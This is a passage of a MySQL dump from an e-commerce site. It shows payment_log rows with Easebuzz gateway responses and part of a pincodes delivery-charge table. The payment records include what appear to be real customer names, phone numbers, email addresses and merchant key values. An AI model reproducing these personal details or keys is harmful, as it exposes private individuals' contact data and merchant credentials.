05:17:48\",\"cash_back_percentage\":\"50.0\",\"status\":\"success\",\"udf1\":\"\",\"merchant_logo\":\"NA\",\"udf6\":\"\",\"udf10\":\"\",\"txnid\":\"Test27\",\"productinfo\":\"For test\",\"furl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/order_failure\\/64\",\"card_type\":\"Debit Card\",\"amount\":\"972.0\",\"udf2\":\"\",\"udf5\":\"\",\"mode\":\"DC\",\"udf7\":\"\",\"error\":\"NA\",\"udf9\":\"\",\"bankcode\":\"NA\",\"deduction_percentage\":\"2.30\",\"email\":\"developerweb50@gmail.com\",\"udf4\":\"\"}', '2022-08-02 10:48:20', '2022-08-02 05:18:20', 1, 'TRETIIGRIJ', 'b75c2db44087e74965b829c58d389e332ae7073e8c0a5eb6c3eaf5246c6abc67ca791dc084989a241cdd89837bf21bf0073d', 'success', '', 64, '', '', ''),
(134, '67988674400', '', 536, '', '2022-08-02 11:07:59', '2022-08-02 05:37:59', -1, '', '', 'pending', '', 65, '', '', ''),
(135, '17401497172', '', 576, '', '2022-08-02 11:08:59', '2022-08-02 05:38:59', -1, '', '', 'pending', '', 66, '', '', ''),
(136, '13382675347', '', 418, '', '2022-08-02 11:12:28', '2022-08-02 05:42:28', -1, '', '', 'pending', '', 67, '', '', ''),
(137, '54452643559', '', 418, '{\"name_on_card\":\"NA\",\"bank_ref_num\":\"418.0\",\"udf3\":\"\",\"hash\":\"ff94e659aa8b101c61d59cff170046894927df90634e2164e6379f0551eed554d3113f0d62860aab2db6ada5d29c725d01b2b2187750dec14cb8d5c8a7e733b9\",\"firstname\":\"syed afroz\",\"net_amount_debit\":\"418.0\",\"payment_source\":\"Easebuzz\",\"surl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/razorpayResponse\\/68\",\"error_Message\":\"PGS10001-Success\",\"issuing_bank\":\"NA\",\"cardCategory\":\"NA\",\"phone\":\"7090099999\",\"easepayid\":\"T3PCYIVFZL\",\"cardnum\":\"NA\",\"key\":\"2PBP7IABZ2\",\"udf8\":\"\",\"unmappedstatus\":\"NA\",\"PG_TYPE\":\"NA\",\"addedon\":\"2022-08-02 08:40:33\",\"cash_back_percentage\":\"50.0\",\"status\":\"success\",\"udf1\":\"\",\"merchant_logo\":\"NA\",\"udf6\":\"\",\"udf10\":\"\",\"txnid\":\"Test24\",\"productinfo\":\"For test\",\"furl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/order_failure\\/68\",\"card_type\":\"Debit Card\",\"amount\":\"418.0\",\"udf2\":\"\",\"udf5\":\"\",\"mode\":\"DC\",\"udf7\":\"\",\"error\":\"NA\",\"udf9\":\"\",\"bankcode\":\"NA\",\"deduction_percentage\":\"2.30\",\"email\":\"developerweb50@gmail.com\",\"udf4\":\"\"}', '2022-08-02 14:11:46', '2022-08-02 08:41:46', 1, 'T3PCYIVFZL', 'ff94e659aa8b101c61d59cff170046894927df90634e2164e6379f0551eed554d3113f0d62860aab2db6ada5d29c725d01b2', 'success', '', 68, '', '', ''),
(138, '44516526377', '', 845, '', '2022-08-02 15:31:26', '2022-08-02 10:01:26', -1, '', '', 'pending', '', 69, '', '', ''),
(139, '65172738189', '', 559, '{\"name_on_card\":\"NA\",\"bank_ref_num\":\"559.0\",\"udf3\":\"\",\"hash\":\"57f44ecc3074a3275c474c95922f76efe64bf5b67ce9655b3c5b8b4e5a3c864a4c20a205a78f9932629d2b6f8ba9ad36484ccc892b1793fe1e13b6d9c4b80443\",\"firstname\":\"syed afroz\",\"net_amount_debit\":\"559.0\",\"payment_source\":\"Easebuzz\",\"surl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/razorpayResponse\\/70\",\"error_Message\":\"PGS10001-Success\",\"issuing_bank\":\"NA\",\"cardCategory\":\"NA\",\"phone\":\"7090099999\",\"easepayid\":\"T4Q2TGQ0XT\",\"cardnum\":\"NA\",\"key\":\"2PBP7IABZ2\",\"udf8\":\"\",\"unmappedstatus\":\"NA\",\"PG_TYPE\":\"NA\",\"addedon\":\"2022-08-03 07:21:55\",\"cash_back_percentage\":\"50.0\",\"status\":\"success\",\"udf1\":\"\",\"merchant_logo\":\"NA\",\"udf6\":\"\",\"udf10\":\"\",\"txnid\":\"Test32\",\"productinfo\":\"For test\",\"furl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/order_failure\\/70\",\"card_type\":\"Debit Card\",\"amount\":\"559.0\",\"udf2\":\"\",\"udf5\":\"\",\"mode\":\"DC\",\"udf7\":\"\",\"error\":\"NA\",\"udf9\":\"\",\"bankcode\":\"NA\",\"deduction_percentage\":\"2.30\",\"email\":\"developerweb50@gmail.com\",\"udf4\":\"\"}', '2022-08-03 12:52:22', '2022-08-03 07:22:22', 1, 'T4Q2TGQ0XT', '57f44ecc3074a3275c474c95922f76efe64bf5b67ce9655b3c5b8b4e5a3c864a4c20a205a78f9932629d2b6f8ba9ad36484c', 'success', '', 70, '', '', ''),
(140, '92550163795', '', 3078, '', '2022-08-03 15:26:51', '2022-08-03 09:56:51', -1, '', '', 'pending', '', 71, '', '', ''),
(141, '87597533967', '', 197, '{\"name_on_card\":\"NA\",\"bank_ref_num\":\"197.0\",\"udf3\":\"\",\"hash\":\"ca2f3c049627b18601d99975c9adc277ff6219ae0e2635613844d5eba562751489dca57cad795da8f680f0b124dc7c070f67d4a6f86d408ab2ae45563c9aa735\",\"firstname\":\"Suresh\",\"net_amount_debit\":\"197.0\",\"payment_source\":\"Easebuzz\",\"surl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/razorpayResponse\\/72\",\"error_Message\":\"PGS10001-Success\",\"issuing_bank\":\"NA\",\"cardCategory\":\"NA\",\"phone\":\"9845324064\",\"easepayid\":\"TT8P2TXJ88\",\"cardnum\":\"NA\",\"key\":\"2PBP7IABZ2\",\"udf8\":\"\",\"unmappedstatus\":\"NA\",\"PG_TYPE\":\"NA\",\"addedon\":\"2022-08-03 10:08:22\",\"cash_back_percentage\":\"50.0\",\"status\":\"success\",\"udf1\":\"\",\"merchant_logo\":\"NA\",\"udf6\":\"\",\"udf10\":\"\",\"txnid\":\"Test71\",\"productinfo\":\"For test\",\"furl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/order_failure\\/72\",\"card_type\":\"Debit Card\",\"amount\":\"197.0\",\"udf2\":\"\",\"udf5\":\"\",\"mode\":\"DC\",\"udf7\":\"\",\"error\":\"NA\",\"udf9\":\"\",\"bankcode\":\"NA\",\"deduction_percentage\":\"2.30\",\"email\":\"gvsureshiyer@gmail.com\",\"udf4\":\"\"}', '2022-08-03 15:40:47', '2022-08-03 10:10:47', 1, 'TT8P2TXJ88', 'ca2f3c049627b18601d99975c9adc277ff6219ae0e2635613844d5eba562751489dca57cad795da8f680f0b124dc7c070f67', 'success', '', 72, '', '', ''),
(142, '56487523585', '', 634, '{\"name_on_card\":\"NA\",\"bank_ref_num\":\"634.08\",\"udf3\":\"\",\"hash\":\"8637cbd384e48167864dc91e5f6bfd766e7a18c0e9feb043b82715ab9f095f5075f5a215a3b052d36b3c74d228f9c584c81fc046b5c1d6a1becc3bdeae6465da\",\"firstname\":\"syed afroz\",\"net_amount_debit\":\"634.08\",\"payment_source\":\"Easebuzz\",\"surl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/razorpayResponse\\/74\",\"error_Message\":\"PGS10001-Success\",\"issuing_bank\":\"NA\",\"cardCategory\":\"NA\",\"phone\":\"7090099999\",\"easepayid\":\"T59PD9IYH5\",\"cardnum\":\"NA\",\"key\":\"2PBP7IABZ2\",\"udf8\":\"\",\"unmappedstatus\":\"NA\",\"PG_TYPE\":\"NA\",\"addedon\":\"2022-08-04 04:08:44\",\"cash_back_percentage\":\"50.0\",\"status\":\"success\",\"udf1\":\"\",\"merchant_logo\":\"NA\",\"udf6\":\"\",\"udf10\":\"\",\"txnid\":\"Test93\",\"productinfo\":\"For test\",\"furl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/order_failure\\/74\",\"card_type\":\"Debit Card\",\"amount\":\"634.08\",\"udf2\":\"\",\"udf5\":\"\",\"mode\":\"DC\",\"udf7\":\"\",\"error\":\"NA\",\"udf9\":\"\",\"bankcode\":\"NA\",\"deduction_percentage\":\"2.30\",\"email\":\"developerweb50@gmail.com\",\"udf4\":\"\"}', '2022-08-04 09:39:47', '2022-08-04 04:09:47', 1, 'T59PD9IYH5', '8637cbd384e48167864dc91e5f6bfd766e7a18c0e9feb043b82715ab9f095f5075f5a215a3b052d36b3c74d228f9c584c81f', 'success', '', 74, '', '', '');
INSERT INTO `payment_log` (`id`, `order_id`, `razor_oid`, `amount`, `pay_array`, `added_datetime`, `modify_date`, `status`, `pay_id`, `signature`, `pstatus`, `payment_log`, `oid`, `save_resp`, `gen_signature`, `randid`) VALUES
(143, '49828747161', '', 406, '{\"name_on_card\":\"NA\",\"bank_ref_num\":\"406.0\",\"udf3\":\"\",\"hash\":\"1ccbf8ab08ba0366596494431c63fbf6a7bd55efb4f2394589ad1b0edc87d161d398e726cd8861940edab79fccf6868af4991135e56bce2e72f580b78d64e996\",\"firstname\":\"syed afroz\",\"net_amount_debit\":\"406.0\",\"payment_source\":\"Easebuzz\",\"surl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/razorpayResponse\\/75\",\"error_Message\":\"PGS10001-Success\",\"issuing_bank\":\"NA\",\"cardCategory\":\"NA\",\"phone\":\"7090099999\",\"easepayid\":\"T228RFPD0S\",\"cardnum\":\"NA\",\"key\":\"2PBP7IABZ2\",\"udf8\":\"\",\"unmappedstatus\":\"NA\",\"PG_TYPE\":\"NA\",\"addedon\":\"2022-08-04 04:20:58\",\"cash_back_percentage\":\"50.0\",\"status\":\"success\",\"udf1\":\"\",\"merchant_logo\":\"NA\",\"udf6\":\"\",\"udf10\":\"\",\"txnid\":\"Test95\",\"productinfo\":\"For test\",\"furl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/order_failure\\/75\",\"card_type\":\"Debit Card\",\"amount\":\"406.0\",\"udf2\":\"\",\"udf5\":\"\",\"mode\":\"DC\",\"udf7\":\"\",\"error\":\"NA\",\"udf9\":\"\",\"bankcode\":\"NA\",\"deduction_percentage\":\"2.30\",\"email\":\"developerweb50@gmail.com\",\"udf4\":\"\"}', '2022-08-04 09:51:56', '2022-08-04 04:21:56', 1, 'T228RFPD0S', '1ccbf8ab08ba0366596494431c63fbf6a7bd55efb4f2394589ad1b0edc87d161d398e726cd8861940edab79fccf6868af499', 'success', '', 75, '', '', ''),
(144, '57443924345', '', 456, '', '2022-08-04 10:19:59', '2022-08-04 04:49:59', -1, '', '', 'pending', '', 76, '', '', ''),
(145, '80096933383', '', 456, '', '2022-08-04 10:23:48', '2022-08-04 04:53:48', -1, '', '', 'pending', '', 77, '', '', ''),
(146, '39076858837', '', 180, '{\"name_on_card\":\"NA\",\"bank_ref_num\":\"179.92\",\"udf3\":\"\",\"hash\":\"fcc537364e206065e5aaf1ec0df5c60d7b0fdc73fffb7045f801b49b197255d8f167bc318d69ba653df0b8677b4353e8d98eabd0308eede587c427d1302f7ef2\",\"firstname\":\"Ashwin\",\"net_amount_debit\":\"179.92\",\"payment_source\":\"Easebuzz\",\"surl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/razorpayResponse\\/83\",\"error_Message\":\"PGS10001-Success\",\"issuing_bank\":\"NA\",\"cardCategory\":\"NA\",\"phone\":\"9535070670\",\"easepayid\":\"T5VKXJB58Z\",\"cardnum\":\"NA\",\"key\":\"2PBP7IABZ2\",\"udf8\":\"\",\"unmappedstatus\":\"NA\",\"PG_TYPE\":\"NA\",\"addedon\":\"2022-08-04 07:07:00\",\"cash_back_percentage\":\"50.0\",\"status\":\"success\",\"udf1\":\"\",\"merchant_logo\":\"NA\",\"udf6\":\"\",\"udf10\":\"\",\"txnid\":\"Test26\",\"productinfo\":\"For test\",\"furl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/order_failure\\/83\",\"card_type\":\"Netbanking\",\"amount\":\"179.92\",\"udf2\":\"\",\"udf5\":\"\",\"mode\":\"NB\",\"udf7\":\"\",\"error\":\"NA\",\"udf9\":\"\",\"bankcode\":\"NA\",\"deduction_percentage\":\"2.00\",\"email\":\"ashwin@savithru.com\",\"udf4\":\"\"}', '2022-08-04 12:38:22', '2022-08-04 07:08:22', 1, 'T5VKXJB58Z', 'fcc537364e206065e5aaf1ec0df5c60d7b0fdc73fffb7045f801b49b197255d8f167bc318d69ba653df0b8677b4353e8d98e', 'success', '', 83, '', '', ''),
(147, '42403953825', '', 419, '{\"name_on_card\":\"NA\",\"bank_ref_num\":\"418.72\",\"udf3\":\"\",\"hash\":\"5a9e31d48d567854edace6ebd962b9eacb9c76c3c95829814045151a4d17630b6ea6d0be16164b7f883b9d857e4c9b592747fe1f40e94f0405b08b629a773539\",\"firstname\":\"syed afroz\",\"net_amount_debit\":\"418.72\",\"payment_source\":\"Easebuzz\",\"surl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/razorpayResponse\\/\",\"error_Message\":\"PGS10001-Success\",\"issuing_bank\":\"NA\",\"cardCategory\":\"NA\",\"phone\":\"9986571787\",\"easepayid\":\"TX7KXNSOHM\",\"cardnum\":\"NA\",\"key\":\"2PBP7IABZ2\",\"udf8\":\"\",\"unmappedstatus\":\"NA\",\"PG_TYPE\":\"NA\",\"addedon\":\"2022-08-08 07:19:39\",\"cash_back_percentage\":\"50.0\",\"status\":\"success\",\"udf1\":\"GGA00088\",\"merchant_logo\":\"NA\",\"udf6\":\"\",\"udf10\":\"\",\"txnid\":\"Test29\",\"productinfo\":\"For test\",\"furl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/razorpayResponse\\/\",\"card_type\":\"Debit Card\",\"amount\":\"418.72\",\"udf2\":\"\",\"udf5\":\"\",\"mode\":\"DC\",\"udf7\":\"\",\"error\":\"NA\",\"udf9\":\"\",\"bankcode\":\"NA\",\"deduction_percentage\":\"2.30\",\"email\":\"developerweb50@gmail.com\",\"udf4\":\"\"}', '2022-08-08 13:10:10', '2022-08-08 07:40:10', 1, 'TX7KXNSOHM', '5a9e31d48d567854edace6ebd962b9eacb9c76c3c95829814045151a4d17630b6ea6d0be16164b7f883b9d857e4c9b592747', 'success', '', 88, '', '', ''),
(149, '88222340640', '', 681, '{\"name_on_card\":\"NA\",\"bank_ref_num\":\"681.0\",\"udf3\":\"\",\"hash\":\"31b901c1ea84a5e5f9ee54fbf4dd48515ae7a0ae2b36e48175d41d0505cb5c46248d63c11714e0cbe300df6bf1920c5b5f7f4cb2024876ca2e7b20e0b0bd2cda\",\"firstname\":\"syed afroz\",\"net_amount_debit\":\"681.0\",\"payment_source\":\"Easebuzz\",\"surl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/razorpayResponse\\/\",\"error_Message\":\"PGS10001-Success\",\"issuing_bank\":\"NA\",\"cardCategory\":\"NA\",\"phone\":\"9986571787\",\"easepayid\":\"T6IPI4TQLH\",\"cardnum\":\"NA\",\"key\":\"2PBP7IABZ2\",\"udf8\":\"\",\"unmappedstatus\":\"NA\",\"PG_TYPE\":\"NA\",\"addedon\":\"2022-08-08 07:48:33\",\"cash_back_percentage\":\"50.0\",\"status\":\"success\",\"udf1\":\"GGA00090\",\"merchant_logo\":\"NA\",\"udf6\":\"\",\"udf10\":\"\",\"txnid\":\"Test36\",\"productinfo\":\"For test\",\"furl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/razorpayResponse\\/\",\"card_type\":\"Debit Card\",\"amount\":\"681.0\",\"udf2\":\"\",\"udf5\":\"\",\"mode\":\"DC\",\"udf7\":\"\",\"error\":\"NA\",\"udf9\":\"\",\"bankcode\":\"NA\",\"deduction_percentage\":\"2.30\",\"email\":\"developerweb50@gmail.com\",\"udf4\":\"\"}', '2022-08-08 13:19:14', '2022-08-08 07:49:14', 1, 'T6IPI4TQLH', '31b901c1ea84a5e5f9ee54fbf4dd48515ae7a0ae2b36e48175d41d0505cb5c46248d63c11714e0cbe300df6bf1920c5b5f7f', 'success', '', 90, '', '', ''),
(150, '9704190204', '', 419, '{\"name_on_card\":\"NA\",\"bank_ref_num\":\"418.72\",\"udf3\":\"\",\"hash\":\"fed51988aea928ae2591cd47afdee5df5c4779ad3dcbbf86a56955111efb07d245e42a13f0eeecb64e54f3c123f5f598e62a22be7351e09e32ffa132fa5a6a4f\",\"firstname\":\"syed afroz\",\"net_amount_debit\":\"418.72\",\"payment_source\":\"Easebuzz\",\"surl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/razorpayResponse\\/\",\"error_Message\":\"PGS10001-Success\",\"issuing_bank\":\"NA\",\"cardCategory\":\"NA\",\"phone\":\"9986571787\",\"easepayid\":\"TYKT59NK11\",\"cardnum\":\"NA\",\"key\":\"2PBP7IABZ2\",\"udf8\":\"\",\"unmappedstatus\":\"NA\",\"PG_TYPE\":\"NA\",\"addedon\":\"2022-08-08 08:32:22\",\"cash_back_percentage\":\"50.0\",\"status\":\"success\",\"udf1\":\"GGA00091\",\"merchant_logo\":\"NA\",\"udf6\":\"\",\"udf10\":\"\",\"txnid\":\"Test19\",\"productinfo\":\"For test\",\"furl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/razorpayResponse\\/\",\"card_type\":\"Debit Card\",\"amount\":\"418.72\",\"udf2\":\"\",\"udf5\":\"\",\"mode\":\"DC\",\"udf7\":\"\",\"error\":\"NA\",\"udf9\":\"\",\"bankcode\":\"NA\",\"deduction_percentage\":\"2.30\",\"email\":\"developerweb50@gmail.com\",\"udf4\":\"\"}', '2022-08-08 14:02:52', '2022-08-08 08:32:52', 1, 'TYKT59NK11', 'fed51988aea928ae2591cd47afdee5df5c4779ad3dcbbf86a56955111efb07d245e42a13f0eeecb64e54f3c123f5f598e62a', 'success', '', 91, '', '', ''),
(151, '53941026123', '', 359, '{\"name_on_card\":\"NA\",\"bank_ref_num\":\"359.36\",\"udf3\":\"\",\"hash\":\"3c850eb9d530b82ae7618492aae75176f5fc1934c8d013808fba61c69d986434dd5940c1c8ddef676a46e216173ecd6e74fc36951da6a07ac77f39001e376572\",\"firstname\":\"syed afroz\",\"net_amount_debit\":\"359.36\",\"payment_source\":\"Easebuzz\",\"surl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/razorpayResponse\\/\",\"error_Message\":\"PGS10001-Success\",\"issuing_bank\":\"NA\",\"cardCategory\":\"NA\",\"phone\":\"9986571787\",\"easepayid\":\"TUBMTO3HVM\",\"cardnum\":\"NA\",\"key\":\"2PBP7IABZ2\",\"udf8\":\"\",\"unmappedstatus\":\"NA\",\"PG_TYPE\":\"NA\",\"addedon\":\"2022-08-08 08:57:18\",\"cash_back_percentage\":\"50.0\",\"status\":\"success\",\"udf1\":\"GGA00092\",\"merchant_logo\":\"NA\",\"udf6\":\"\",\"udf10\":\"\",\"txnid\":\"Test78\",\"productinfo\":\"For test\",\"furl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/razorpayResponse\\/\",\"card_type\":\"Debit Card\",\"amount\":\"359.36\",\"udf2\":\"\",\"udf5\":\"\",\"mode\":\"DC\",\"udf7\":\"\",\"error\":\"NA\",\"udf9\":\"\",\"bankcode\":\"NA\",\"deduction_percentage\":\"2.30\",\"email\":\"developerweb50@gmail.com\",\"udf4\":\"\"}', '2022-08-08 14:27:50', '2022-08-08 08:57:50', 1, 'TUBMTO3HVM', '3c850eb9d530b82ae7618492aae75176f5fc1934c8d013808fba61c69d986434dd5940c1c8ddef676a46e216173ecd6e74fc', 'success', '', 92, '', '', ''),
(152, '9335261', '', 257, '', '2022-08-08 14:34:16', '2022-08-08 09:04:16', -1, '', '', '', '', 93, '', '', ''),
(153, '2399850', '', 180, '', '2022-08-08 14:43:02', '2022-08-08 09:13:02', -1, '', '', '', '', 94, '', '', ''),
(154, '7541811', '', 257, '', '2022-08-08 15:01:21', '2022-08-08 09:31:21', -1, '', '', '', '', 95, '', '', ''),
(155, '5826436', '', 257, '', '2022-08-08 15:02:05', '2022-08-08 09:32:05', -1, '', '', '', '', 96, '', '', ''),
(156, '2679107', '', 177, '', '2022-08-08 16:19:11', '2022-08-08 10:49:11', -1, '', '', '', '', 99, '', '', ''),
(157, '1877125', '', 262, '', '2022-08-09 15:09:13', '2022-08-09 09:39:13', -1, '', '', '', '', 111, '', '', ''),
(158, '6982268', '', 257, '', '2022-08-11 12:46:30', '2022-08-11 07:16:30', -1, '', '', '', '', 113, '', '', ''),
(159, '92003796023', '', 206, '', '2022-09-16 16:08:48', '2022-09-16 10:38:48', -1, '', '', 'pending', '', 121, '', '', ''),
(160, '70199885971', '', 135, '', '2022-10-17 17:28:46', '2022-10-17 11:58:46', -1, '', '', 'pending', '', 123, '', '', ''),
(161, '79482613771', '', 362, '', '2022-10-26 16:36:12', '2022-10-26 11:06:12', -1, '', '', 'pending', '', 127, '', '', ''),
(162, '1274067', '', 177, '{\"txnid\":\"6bea434c32a39e88acb4\",\"user_id\":\"5\",\"user_name\":\"Ashwin text\",\"emailid\":\"ashwin@savithru.com\",\"tot_qty\":1,\"total_amt\":\"127.0\",\"coupon_code\":\"\",\"discount\":\"0.00\",\"saved_amt\":\"\",\"devilery_charge\":\"50\",\"total_amt_paid\":\"177.00\",\"delivery_days\":\"4\",\"ordered_date\":\"2022-10-26 16:52:44\",\"delivery_date\":\"2022-10-30\",\"status\":2,\"paymode\":\"Online\",\"taxamount\":\"0.00\",\"pincode\":\"560010\",\"randid\":70935230,\"discount_per\":\"00\"}', '2022-10-26 16:52:44', '2022-10-26 11:22:44', -1, '', '', '', '', 128, '', '', ''),
(163, '8480584', '', 177, '{\"txnid\":\"9a9789f30a519b700b4f\",\"user_id\":\"5\",\"user_name\":\"Ashwin text\",\"emailid\":\"ashwin@savithru.com\",\"tot_qty\":1,\"total_amt\":\"127.0\",\"coupon_code\":\"\",\"discount\":\"0.00\",\"saved_amt\":\"\",\"devilery_charge\":\"50\",\"total_amt_paid\":\"177.00\",\"delivery_days\":\"4\",\"ordered_date\":\"2022-10-26 16:55:07\",\"delivery_date\":\"2022-10-30\",\"status\":2,\"paymode\":\"Online\",\"taxamount\":\"0.00\",\"pincode\":\"560010\",\"randid\":29875792,\"discount_per\":\"00\"}', '2022-10-26 16:55:07', '2022-10-26 11:25:07', -1, '', '', '', '', 129, '', '', ''),
(164, '8347798', '', 177, '', '2022-10-26 16:59:02', '2022-10-26 11:29:02', -1, '', '', '', '', 130, '', '', ''),
(165, '5831317', '', 177, '', '2022-10-26 17:11:22', '2022-10-26 11:41:22', -1, '', '', '', '', 131, '', '', ''),
(166, '43770189189', '', 127, '{\"name_on_card\":\"G v ramesh\",\"bank_ref_num\":\"230067018339\",\"udf3\":\"\",\"hash\":\"7a32096291e27413a1708670b24f211f8d83c2dcff0e56cd73c4c88525a1547a0a91e47e14332dcd17d683320bb2e25eb970a8021fab94926765102c03f48160\",\"firstname\":\"suresh\",\"net_amount_debit\":\"127.0\",\"payment_source\":\"Easebuzz\",\"surl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/easebuzzResponse\\/\",\"error_Message\":\"Successful Transaction\",\"issuing_bank\":\"NA\",\"cardCategory\":\"NA\",\"phone\":\"9845324064\",\"easepayid\":\"E221027L4K6Z1Y\",\"cardnum\":\"XXXXXXXXXXXX9145\",\"key\":\"B86M0DKPUZ\",\"udf8\":\"\",\"unmappedstatus\":\"NA\",\"PG_TYPE\":\"NA\",\"addedon\":\"2022-10-27 05:10:41\",\"cash_back_percentage\":\"50.0\",\"status\":\"success\",\"card_type\":\"Credit Card\",\"merchant_logo\":\"NA\",\"udf6\":\"\",\"udf10\":\"\",\"upi_va\":\"NA\",\"txnid\":\"GOG37\",\"productinfo\":\"For test\",\"bank_name\":\"NA\",\"furl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/easebuzzResponse\\/\",\"udf1\":\"GGA00149\",\"amount\":\"127.0\",\"udf2\":\"\",\"udf5\":\"\",\"mode\":\"CC\",\"udf7\":\"\",\"error\":\"Successful Transaction\",\"udf9\":\"\",\"bankcode\":\"NA\",\"deduction_percentage\":\"2.25\",\"email\":\"gvsuresh@savithru.com\",\"udf4\":\"\"}', '2022-10-27 10:44:55', '2022-10-27 05:14:55', 1, 'E221027L4K6Z1Y', '7a32096291e27413a1708670b24f211f8d83c2dcff0e56cd73c4c88525a1547a0a91e47e14332dcd17d683320bb2e25eb970', 'success', '', 149, '', '', ''),
(167, '6393781', '', 177, '', '2022-11-04 11:09:39', '2022-11-04 05:39:39', -1, '', '', '', '', 150, '', '', ''),
(168, '47290047303', '', 117, '', '2022-11-16 11:29:30', '2022-11-16 05:59:30', -1, '', '', 'pending', '', 154, '', '', ''),
(169, '5961389125', '', 117, '', '2022-12-06 10:17:08', '2022-12-06 04:47:08', -1, '', '', 'pending', '', 155, '', '', ''),
(170, '52503727446', '', 117, '', '2023-02-11 10:20:44', '2023-02-11 04:50:44', -1, '', '', 'pending', '', 156, '', '', '');

-- --------------------------------------------------------

--
-- Table structure for table `pincodes`
--

CREATE TABLE `pincodes` (
  `id` int(11) NOT NULL,
  `pincode` varchar(100) NOT NULL,
  `charges` float NOT NULL DEFAULT '0',
  `pincode1` varchar(100) NOT NULL,
  `state` int(11) NOT NULL,
  `city_id` int(11) NOT NULL,
  `status` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `pincodes`
--

INSERT INTO `pincodes` (`id`, `pincode`, `charges`, `pincode1`, `state`, `city_id`, `status`) VALUES
(315, '562158', 300, '562158', 0, 2, 0),
(314, '562157', 300, '562157', 0, 2, 0),
(313, '562154', 300, '562154', 0, 2, 0),
(312, '562153', 300, '562153', 0, 2, 0),
(311, '562152', 300, '562152', 0, 2, 0),
(310, '562151', 300, '562151', 0, 2, 0),
(309, '562150', 300, '562150', 0, 2, 0),
(308, '562149', 301, '562149', 0, 2, 0),
(307, '562148', 300, '562148', 0, 2, 0),
(306, '562147', 300, '562147', 0, 2, 0),
(305, '562145', 300, '562145', 0, 2, 0),
(304, '562144', 300, '562144', 0, 2, 0),
(303, '562143', 300, '562143', 0, 2, 0),
(302, '562142', 300, '562142', 0, 2, 0),
(301, '562140', 300, '562140', 0, 2, 0),
(300, '562139', 300, '562139', 0, 2, 0),
(299, '562138', 300, '562138', 0, 2, 0),
(298, '562137', 300, '562137', 0, 2, 0),
(297, '562136', 300, '562136', 0, 2, 0),
(296, '562135', 300, '562135', 0, 2, 0),
(295, '562134', 300, '562134', 0, 2, 0),
(294, '562132', 300, '562132', 0, 2, 0),
(293, '562131', 300, '562131', 0, 2, 0),
(292, '562130', 300, '562130', 0, 2, 0),
(291, '562129', 300, '562129', 0, 2, 0),
(290, '562128', 300, '562128', 0, 2, 0),
(289, '562127', 300, '562127', 0, 2, 0),
(288, '562126', 300, '562126', 0, 2, 0),
(287, '562125', 300, '562125', 0, 2, 0),
(286, '562124', 300, '562124', 0, 2, 0),
(285, '562123', 300, '562123', 0, 2, 0),
(284, '562122', 300, '562122', 0, 2, 0),
(283, '562121', 300, '562121', 0, 2, 0),
(282, '562120', 300, '562120', 0, 2, 0),
(281, '562119', 300, '562119', 0, 2, 0),
(280, '562117', 300, '562117', 0, 2, 0),
(279, '562115', 300, '562115', 0, 2, 0),
(278, '562114', 300, '562114', 0, 2, 0),
(277, '562112', 300, '562112', 0, 2, 0),
(276, '562111', 300, '562111', 0, 2, 0),
(275, '562110', 300, '562110', 0, 2, 0),
(274, '562109', 300, '562109', 0, 2, 0),
(273, '562108', 300, '562108', 0, 2, 0),
(272, '562107', 300, '562107', 0, 2, 0),
(271, '562106', 300, '562106', 0, 2, 0),
(270, '562101', 300, '562101', 0, 2, 0),
(269, '561227', 300, '561227', 0, 2, 0),
(268, '561226', 300, '561226', 0, 2, 0),
(267, '561216', 300, '561216', 0, 2, 0),
(266, '561215', 300, '561215', 0, 2, 0),
(265, '561214', 300, '561214', 0, 2, 0),
(264, '561205', 300, '561205', 0, 2, 0),
(263, '561204', 300, '561204', 0, 2, 0),
(262, '561203', 300, '561203', 0, 2, 0),
(261, '561201', 300, '561201', 0, 2, 0),
(260, '561101', 300, '561101', 0, 2, 0),
(259, '560103', 50, '560103', 0, 2, 0),
(258, '560100', 50, '560100', 0, 2, 0),
(257, '560099', 50, '560099', 0, 2, 0),
(256, '560098', 50, '560098', 0, 2, 0),
(255, '560097', 50, '560097', 0, 2, 0),
(254, '560096', 50, '560096', 0, 2, 0),
(253, '560095', 50, '560095', 0, 2, 0),
(252, '560094', 50, '560094', 0, 2, 0),
(251, '560093', 50, '560093', 0, 2, 0),
(250, '560092', 50, '560092', 0, 2, 0),
(249, '560091', 50, '560091', 0, 2, 0),
(248, '560090', 50, '560090', 0, 2, 0),
(247, '560089', 50, '560089', 0, 2, 0),
(246, '560088', 50, '560088', 0, 2, 0),
(245, '560087', 50, '560087', 0, 2, 0),
(244, '560086', 50, '560086', 0, 2, 0),
(243, '560085', 50, '560085', 0, 2, 0),
(242, '560084', 50, '560084', 0, 2, 0),
(241, '560083', 50, '560083', 0, 2, 0),
(240, '560082', 50, '560082', 0, 2, 0),
(239, '560081', 50, '560081', 0, 2, 0),
(238, '560080', 50, '560080', 0, 2, 0),
(237, '560079', 50, '560079', 0, 2, 0),
(236, '560078', 100, '560078', 0, 2, 0),
(235, '560077', 50, '560077', 0, 2, 0),
(234, '560076', 50, '560076', 0, 2, 0),
(233, '560075', 50, '560075', 0, 2, 0),
(232, '560074', 50, '560074', 0, 2, 0),
(231, '560073', 50, '560073', 0, 2, 0),
(230, '560072', 50, '560072', 0, 2, 0),
(229, '560071', 50, '560071', 0, 2, 0),
(228, '560070', 50, '560070', 0, 2, 0),
(227, '560069', 50, '560069', 0, 2, 0),
